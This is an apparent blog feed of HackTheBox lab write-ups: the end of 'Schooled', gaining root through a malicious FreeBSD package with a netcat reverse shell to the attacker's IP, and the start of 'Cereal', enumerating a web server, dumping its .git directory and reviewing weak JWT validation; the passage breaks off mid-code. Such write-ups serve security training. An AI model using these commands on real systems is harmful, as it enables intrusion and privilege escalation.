<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «schooled» «10.10.14.49» 
$ ssh jamie@10.10.10.234
Password <span class="k">for</span> jamie@Schooled:
Last login: Tue Mar <span class="m">16</span> 14:44:53 <span class="m">2021</span> from 10.10.14.5
FreeBSD 13.0-BETA3 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c1">#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021</span>

...<span class="o">[</span>SNIP<span class="o">]</span>...

jamie@Schooled:~ $ id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span>
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <strong>jamie</strong> is allowed to run sudo on <code>pkg</code> binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg install *
</code></pre></div><p>According to <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFObins</a>, this can be abused to install malicious FreeBSD package, but <code>fpm </code> has to be <a href="https://github.com/jordansissel/fpm">installed</a> first.</p>
<h4 id="malicious-package">Malicious package</h4>
<p>Using reference from GTFOBins, I can create a malicious package that contains a reverse shell</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol&#39;</span> &gt; <span class="nv">$TF</span>/x.sh<span class="p">;</span>fpm -n x -s dir -t freebsd -a all --before-install <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use <span class="c1">#finish to prevent that.</span>
/var/lib/gems/2.5.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in <span class="sb">`</span>initialize<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new&#39;</span>
        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in <span class="sb">`</span>block in output<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open&#39;</span>
        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in <span class="sb">`</span>output<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute&#39;</span>
        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in <span class="sb">`</span>run<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run&#39;</span>
        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in <span class="sb">`</span>run<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/bin/fpm:7:in `&lt;top (required)&gt;&#39;</span>
        /usr/local/bin/fpm:23:in <span class="sb">`</span>load<span class="s1">&#39;
</span><span class="s1">        /usr/local/bin/fpm:23:in `&lt;main&gt;&#39;</span>
Created package <span class="o">{</span>:path<span class="o">=</span>&gt;<span class="s2">&#34;x-1.0.txz&#34;</span><span class="o">}</span>
</code></pre></div><p>I will transfer the package to Schooled.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
$ <span class="k">$(</span>bash -c <span class="s1">&#39;cat x-1.0.txz &gt; /dev/tcp/10.10.10.234/9000&#39;</span><span class="k">)</span>
</code></pre></div><p>On Schooled:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ nc -lv <span class="m">9000</span> &gt; x-1.0.txz
Connection from 10.10.14.49 <span class="m">60744</span> received!
</code></pre></div><p>I will set a Netcat listener on my Kali and start installatng the malicious package on Schooled.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. <span class="s1">&#39;pkg update&#39;</span> required
Checking integrity... <span class="k">done</span> <span class="o">(</span><span class="m">0</span> conflicting<span class="o">)</span>
The following <span class="m">1</span> package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of <span class="m">0</span> checked<span class="o">)</span>:

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: <span class="m">1</span>
<span class="o">[</span>1/1<span class="o">]</span> Installing x-1.0...
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>And I&rsquo;m rooted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">23093</span>
<span class="c1"># whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; cut -c-15 /root/root.txt</span>
root
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>,5<span class="o">(</span>operator<span class="o">)</span>
Schooled
2462d8e2125d2a0
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://github.com/HoangKien1020/CVE-2020-25627">https://github.com/HoangKien1020/CVE-2020-25627</a></li>
<li><a href="https://github.com/HoangKien1020/CVE-2020-14321">https://github.com/HoangKien1020/CVE-2020-14321</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/pkg/">https://gtfobins.github.io/gtfobins/pkg/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Cereal (User only)</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</link>
      <pubDate>Wed, 09 Jun 2021 07:33:40 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</guid>
      <description>Doing code reviews in order to chain XSS, SSRF, and deserialization vulnerabilities to get RCE</description>
      <content:encoded><![CDATA[<p>Cereal is a hard difficulty Windows machine that features a misconfigured web server, which exposes source code of the currently hosted web application. Initial source code analysis revealed a deleted JWT secret that could be used to forge a JWT token and bypass the application&rsquo;s login page. Another code analysis finds the web is vulnerable to a deserialization attack. There is also an XSS vulnerability in one of the packages used by the application. Chaining these vulnerabilities results in a shell access to the system.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Code review</li>
<li>JWT authentication bypass</li>
<li>XSS exploitation</li>
<li>.NET deserialization</li>
<li>Exploit chain</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-04 23:45 EDT

...&lt;SNIP&gt;...
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl <span class="m">127</span>
80/tcp  open  http    syn-ack ttl <span class="m">127</span>
443/tcp open  https   syn-ack ttl <span class="m">127</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 118.08 seconds
</code></pre></div><p>I&rsquo;ll run another scan with <code>nmap</code> &rsquo;s default scripts.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-04 23:51 EDT

...&lt;SNIP&gt;...
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     Microsoft IIS httpd 10.0
<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="p">|</span>_http-title: Did not follow redirect to https://cereal.htb/
<span class="p">|</span>_https-redirect: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
443/tcp open  ssl/http Microsoft IIS httpd 10.0
<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="p">|</span>_http-title: Cereal
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>cereal.htb
<span class="p">|</span> Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
<span class="p">|</span> Not valid before: 2020-11-11T19:57:18
<span class="p">|</span>_Not valid after:  2040-11-11T20:07:19
<span class="p">|</span>_ssl-date: 2021-06-05T03:51:48+00:00<span class="p">;</span> +5s from scanner time.
<span class="p">|</span> tls-alpn: 
<span class="p">|</span>_  http/1.1
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="p">|</span>_clock-skew: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 23.34 seconds
</code></pre></div><p>This time <code>nmap</code> found two hostnames from the SSL certificate: <code>cereal.htb</code> and <code>source.cereal.htb</code>.</p>
<p>I&rsquo;ll add those hostnames to my <code>/etc/hosts</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.217 cereal.htb source.cereal.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80">TCP 80</h3>
<p>It redirects to the HTTPS.</p>
<h3 id="tcp-443---cerealhtb">TCP 443 - cereal.htb</h3>
<p>Following the redirection ends up at a login form. I tried a few common credentials, but they didn&rsquo;t work here.</p>
<p><div class="img-container"><img src="imgs/image-20210605110703967.png" alt="image-20210605110703967"  /></div>
</p>
<p>Inspecting the source reveals that this site is a react based application.</p>
<p><div class="img-container"><img src="imgs/image-20210609080804206.png" alt="image-20210609080804206"  /></div>
</p>
<p>If I track down the authentication process, this site store the authentication data in browser&rsquo;s local storage with a key name of <code>currentUser</code>, but l&rsquo;ll leave it for now.</p>
<p><div class="img-container"><img src="imgs/image-20210609082429730.png" alt="image-20210609082429730"  /></div>
</p>
<p>I also did a gobuster scan, but didn&rsquo;t find anything useful.</p>
<h3 id="tcp-443---sourcecerealhtb">TCP 443 - source.cereal.htb</h3>
<p>Visiting <code>source.cereal.htb</code> shows a server error message of an ASP.net application:</p>
<p><div class="img-container"><img src="imgs/image-20210605111410148.png" alt="image-20210605111410148"  /></div>
</p>
<p>Nothing I can do with this page, but I&rsquo;ll take note on the leaked file path:</p>
<ul>
<li><code>C:\inetpub\source\default.aspx</code></li>
</ul>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a git repository, and there is also an upload directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     https://source.cereal.htb
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Extensions:              aspx,txt
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/06/05 00:52:32 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/.git/HEAD            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 23<span class="o">]</span>
/Default.aspx         <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 10090<span class="o">]</span>
/aspnet_client        <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 163<span class="o">]</span> <span class="o">[</span>--&gt; https://source.cereal.htb/aspnet_client/<span class="o">]</span>
/default.aspx         <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 9727<span class="o">]</span>                                              
/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 157<span class="o">]</span> <span class="o">[</span>--&gt; https://source.cereal.htb/uploads/<span class="o">]</span>      
                                                                                              
<span class="o">===============================================================</span>
2021/06/05 00:54:41 <span class="nv">Finished</span>
<span class="o">===============================================================</span>
</code></pre></div><p>Access to the <code>.git</code> and the <code>uploads</code> directory are forbidden.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/ <span class="o">&amp;&amp;</span> curl -I -k http://source.cereal.htb/uploads/
HTTP/1.1 <span class="m">403</span> Forbidden
Content-Length: <span class="m">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:01:25 GMT

HTTP/1.1 <span class="m">403</span> Forbidden
Content-Length: <span class="m">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:08:16 GMT
</code></pre></div><p>But requesting files under <code>.git</code> directory are allowed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/HEAD
HTTP/1.1 <span class="m">200</span> OK
Content-Length: <span class="m">23</span>
Content-Type: text/plain
Last-Modified: Wed, <span class="m">11</span> Nov <span class="m">2020</span> 20:09:34 GMT
Accept-Ranges: bytes
ETag: <span class="s2">&#34;adc1d19266b8d61:0&#34;</span>
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:01:29 GMT

→ root@kali «cereal» «10.10.14.3» 
$ curl -s -k http://source.cereal.htb/.git/HEAD
ref: refs/heads/master
</code></pre></div><p>I&rsquo;ll note the <code>uploads</code> directory.</p>
<h3 id="git">Git</h3>
<h4 id="dumping-git-directory">Dumping .git directory</h4>
<p>With <a href="https://github.com/arthaud/git-dumper">git-dumper</a>, I could get all the files in that <code>.git</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ mkdir loot/source-cereal-git <span class="o">&amp;&amp;</span> ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git 
<span class="o">[</span>-<span class="o">]</span> Testing https://source.cereal.htb/.git/HEAD <span class="o">[</span>200<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Testing https://source.cereal.htb/.git/ <span class="o">[</span>403<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching common files
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.gitignore <span class="o">[</span>404<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span class="o">[</span>404<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span class="o">[</span>200<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/description <span class="o">[</span>200<span class="o">]</span>
...&lt;SNIP&gt;...
<span class="o">[</span>-<span class="o">]</span> Finding refs/
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span class="o">[</span>404<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/config <span class="o">[</span>200<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span class="o">[</span>404<span class="o">]</span>
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/HEAD <span class="o">[</span>200<span class="o">]</span>
...&lt;SNIP&gt;...
<span class="o">[</span>-<span class="o">]</span> Finding packs
<span class="o">[</span>-<span class="o">]</span> Finding objects
<span class="o">[</span>-<span class="o">]</span> Fetching objects
<span class="o">[</span>-<span class="o">]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span class="o">[</span>200<span class="o">]</span>
...&lt;SNIP&gt;...
<span class="o">[</span>-<span class="o">]</span> Running git checkout .
</code></pre></div><h4 id="git-history">Git History</h4>
<p>I could see the history of this repository by issuing <code>git log</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210605121727689.png" alt="image-20210605121727689"  /></div>
</p>
<p>Aside from the author&rsquo;s names, one commit with the message &ldquo;Security fixes&rdquo; caught my attention.</p>
<p>I immediately run <code>git diff 8f2a 7bd9</code> to compare the first commit with the security fixes and that reveals a deleted JWT secret.</p>
<p><div class="img-container"><img src="imgs/image-20210609090452619.png" alt="image-20210609090452619"  /></div>
</p>
<p>It looks like the security fixes include prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
<ul>
<li>JWT secret: <code>secretlhfIH&amp;FY*#oysuflkhskjfhefesf</code></li>
</ul>
<h3 id="source-code-analysis-1">Source Code Analysis #1</h3>
<blockquote>
<p>I pointed my sh*tty explanation or at least how I understand it with <code>// &lt;==</code> or  <code># &lt;==</code> in the code snippet. Please, don&rsquo;t bully me for this.</p>
</blockquote>
<h4 id="app-overview">App Overview</h4>
<p>The app consist of ASP.NET (back-end)  and React (front-end).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «source-cereal-git» «10.10.14.3» git:<span class="o">(</span>master<span class="o">)</span> 
$ tree -L <span class="m">1</span> --dirsfirst
.
├── ClientApp
├── Controllers
├── Migrations
├── Models
├── Pages
├── Properties
├── Services
├── ApplicationOptions.cs
├── appsettings.Development.json
├── appsettings.json
├── CerealContext.cs
├── Cereal.csproj
├── DownloadHelper.cs
├── ExtensionMethods.cs
├── IPAddressHandler.cs
├── IPRequirement.cs
├── Program.cs
└── Startup.cs
</code></pre></div><p>The source code of previously seen React app at <code>cereal.htb</code> is on the ClientApp folder.</p>
<p>Here is the overview of app execution flow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Program.cs
 |
 v
Startup.cs  -&gt; Loads appsettings.json
 |
 v
React client
</code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following information:</p>
<ul>
<li>There is IP whitelist</li>
<li>There are two rules that looks like limiting requests and it&rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called <code>/requests</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
<span class="err">...&lt;SNIP&gt;...</span>
  <span class="nt">&#34;AllowedHosts&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
  <span class="nt">&#34;ApplicationOptions&#34;</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">&#34;Whitelist&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;::1&#34;</span> <span class="p">]</span>
  <span class="p">},</span>
  <span class="nt">&#34;IpRateLimiting&#34;</span><span class="p">:</span> <span class="p">{</span>
    <span class="nt">&#34;EnableEndpointRateLimiting&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
    <span class="nt">&#34;StackBlockedRequests&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
    <span class="nt">&#34;RealIpHeader&#34;</span><span class="p">:</span> <span class="s2">&#34;X-Real-IP&#34;</span><span class="p">,</span>
    <span class="nt">&#34;ClientIdHeader&#34;</span><span class="p">:</span> <span class="s2">&#34;X-ClientId&#34;</span><span class="p">,</span>
    <span class="nt">&#34;HttpStatusCode&#34;</span><span class="p">:</span> <span class="mi">429</span><span class="p">,</span>
    <span class="nt">&#34;IpWhitelist&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;::1&#34;</span> <span class="p">],</span>
    <span class="nt">&#34;EndpointWhitelist&#34;</span><span class="p">:</span> <span class="p">[],</span>
    <span class="nt">&#34;ClientWhitelist&#34;</span><span class="p">:</span> <span class="p">[],</span>
    <span class="nt">&#34;GeneralRules&#34;</span><span class="p">:</span> <span class="p">[</span>
      <span class="p">{</span>
        <span class="nt">&#34;Endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;post:/requests&#34;</span><span class="p">,</span>
        <span class="nt">&#34;Period&#34;</span><span class="p">:</span> <span class="s2">&#34;5m&#34;</span><span class="p">,</span>
        <span class="nt">&#34;Limit&#34;</span><span class="p">:</span> <span class="mi">2</span>
      <span class="p">},</span>
      <span class="p">{</span>
        <span class="nt">&#34;Endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
        <span class="nt">&#34;Period&#34;</span><span class="p">:</span> <span class="s2">&#34;5m&#34;</span><span class="p">,</span>
        <span class="nt">&#34;Limit&#34;</span><span class="p">:</span> <span class="mi">150</span>
      <span class="p">}</span>
    <span class="p">]</span>
  <span class="p">}</span>
<span class="p">}</span>

</code></pre></div><h4 id="authentication-vulnerability">Authentication Vulnerability</h4>
<p>Looking into the <code>Startup.cs</code> file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn&rsquo;t validate the issuer and the audience of a JWT token, and <a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">this can raise a security issue</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
    <span class="kt">var</span> <span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;*&#34;</span><span class="p">);</span>
    <span class="n">services</span><span class="p">.</span><span class="n">AddAuthentication</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span>
    <span class="p">{</span>
        <span class="n">x</span><span class="p">.</span><span class="n">DefaultAuthenticateScheme</span> <span class="p">=</span> <span class="n">JwtBearerDefaults</span><span class="p">.</span><span class="n">AuthenticationScheme</span><span class="p">;</span>
        <span class="n">x</span><span class="p">.</span><span class="n">DefaultChallengeScheme</span> <span class="p">=</span> <span class="n">JwtBearerDefaults</span><span class="p">.</span><span class="n">AuthenticationScheme</span><span class="p">;</span>
    <span class="p">})</span>
    <span class="p">.</span><span class="n">AddJwtBearer</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span>
    <span class="p">{</span>
        <span class="n">x</span><span class="p">.</span><span class="n">RequireHttpsMetadata</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="n">x</span><span class="p">.</span><span class="n">SaveToken</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="n">x</span><span class="p">.</span><span class="n">TokenValidationParameters</span> <span class="p">=</span> <span class="k">new</span> <span class="n">TokenValidationParameters</span>
        <span class="p">{</span>
            <span class="n">ValidateIssuerSigningKey</span> <span class="p">=</span> <span class="k">true</span><span class="p">,</span>
            <span class="n">IssuerSigningKey</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SymmetricSecurityKey</span><span class="p">(</span><span class="n">key</span><span class="p">),</span>
            <span class="n">ValidateIssuer</span> <span class="p">=</span> <span class="k">false</span><span class="p">,</span> <span class="c1">// &lt;== No validation
</span><span class="c1"></span>            <span class="n">ValidateAudience</span> <span class="p">=</span> <span class="k">false</span> <span class="c1">// &lt;== No validation
</span><span class="c1"></span>        <span class="p">};</span>
    <span class="p">});</span>
<span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="k">public</span> <span class="n">User</span> <span class="n">Authenticate</span><span class="p">(</span><span class="kt">string</span> <span class="n">username</span><span class="p">,</span> <span class="kt">string</span> <span class="n">password</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">using</span> <span class="p">(</span><span class="kt">var</span> <span class="n">db</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CerealContext</span><span class="p">())</span>
            <span class="p">{</span>
                <span class="kt">var</span> <span class="n">user</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">Users</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">x</span> <span class="p">=&gt;</span> <span class="n">x</span><span class="p">.</span><span class="n">Username</span> <span class="p">==</span> <span class="n">username</span> <span class="p">&amp;&amp;</span> <span class="n">x</span><span class="p">.</span><span class="n">Password</span> <span class="p">==</span> <span class="n">password</span><span class="p">).</span><span class="n">SingleOrDefault</span><span class="p">();</span>

                <span class="c1">// return null if user not found
</span><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="n">user</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
                    <span class="k">return</span> <span class="k">null</span><span class="p">;</span>

                <span class="c1">// authentication successful so generate jwt token
</span><span class="c1"></span>                <span class="kt">var</span> <span class="n">tokenHandler</span> <span class="p">=</span> <span class="k">new</span> <span class="n">JwtSecurityTokenHandler</span><span class="p">();</span>
                <span class="kt">var</span> <span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;*&#34;</span><span class="p">);</span>
                <span class="kt">var</span> <span class="n">tokenDescriptor</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SecurityTokenDescriptor</span>
                <span class="p">{</span>
                    <span class="n">Subject</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ClaimsIdentity</span><span class="p">(</span><span class="k">new</span> <span class="n">Claim</span><span class="p">[]</span>
                    <span class="p">{</span>
                        <span class="k">new</span> <span class="n">Claim</span><span class="p">(</span><span class="n">ClaimTypes</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span> <span class="n">user</span><span class="p">.</span><span class="n">UserId</span><span class="p">.</span><span class="n">ToString</span><span class="p">())</span>
                    <span class="p">}),</span>
                    <span class="n">Expires</span> <span class="p">=</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">UtcNow</span><span class="p">.</span><span class="n">AddDays</span><span class="p">(</span><span class="m">7</span><span class="p">),</span>
